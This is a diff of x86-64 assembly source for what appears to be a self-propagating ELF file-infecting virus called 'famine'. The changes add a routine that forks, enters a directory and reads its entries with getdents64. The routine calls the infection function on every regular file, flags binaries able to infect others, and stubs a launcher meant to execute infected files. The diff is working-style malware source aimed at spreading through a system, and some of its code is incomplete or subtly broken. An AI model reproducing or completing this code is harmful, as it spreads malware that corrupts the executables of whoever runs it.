@@ -532,6 +532,9 @@ handle_dir:
 	syscall; rax = fork()
 	cmp rax, 0
 	jne hd_parent
+	mov rax, 80
+	syscall;chdir(fname);
+	call rec_infect_dir
 	;infect directory here
 	jmp exit_prog
 	hd_parent:
@@ -556,8 +559,65 @@ handle_dir:
 
 retn
 
+;void rec_infect_dir(char *fname)
+rec_infect_dir:
+	sub rsp, 1024;this is gonna be our buffer
+	sub rsp, 4; fd
+	mov rsi, 65536; O_RDONLY | O_DIRECTORY
+	xor rdx, rdx
+	mov rax, 2; sycall open
+	syscall
+	cmp rax, -1
+	je exit_prog ;open error
+ 	mov [rsp], rax
+	dir_read_loop:
+		mov rdi, [rsp];fd of dir
+		lea rsi, [rsp + 4]; addr of buffer
+		mov rdx, 1024;reading max 1024 bytes
+		mov rax, 217;getdents64 syscall
+		syscall
+		cmp rax, -1
+		je exit_prog;getdents64 err
+		cmp rax, 0
+		je dir_read_exit; done reading dir
+		mov r10, rax; store number bytes read
+		xor rcx, rcx; will serve as index to parse files
+		parse_file_loop:
+			mov r8, rsi; save rsi
+			lea r9, [rsi + rcx] ; current linux_dirent64*
+			lea rsi, [r9 + 19];filename
+			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
+			jne skip_file
+			mov rdi, rsi; pass fname as arg
+			call famine_file ; void famine_file(char * fname);
+			cmp r11, 0
+			je skip_file; we still need to find a file able to infect others
+			mov rdi, [r9 + 19];filename
+			call launch_infected
+			skip_file: 
+			mov rsi, r8
+			xor rdx, rdx
+			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
+			add rcx, rdx
+			cmp rcx, r10
+			jae parse_file_exit
+			jmp parse_file_loop
+		parse_file_exit: 
+		jmp dir_read_loop
+	dir_read_exit:
+	add rsp, 4
+	add rsp,1024
+retn
+
+;void launch_infected(char *fname)
+;basically execve(fname, {fname, NULL}, NULL);
+launch_infected:
+
+retn
+
 ;infect ONE file
-;void famine_file(char *fname)
+;int famine_file(char *fname)
+;special note : ret value will be in r11, will return 1 if binary is able to infect others, 0 otherwise
 famine_file:
 	push rbx
 	push rcx
@@ -575,7 +635,7 @@ famine_file:
 	sub rsp, 4 ;fd
 	
 	;call ft_puts ;PRINT FNAME FOR DEBUGGING
-
+	xor r11, r11
 	mov [rsp + 20], rdi
 	call open_file
 	cmp rax, -1
@@ -620,6 +680,7 @@ famine_file:
 	call parse64elf
 	mov rdi, [rsp + 20]; fname 
 	call overwrite_file
+	mov r11, 1
 	jmp leave_famine_file
 	;32BIT FILE
 	file32bit:
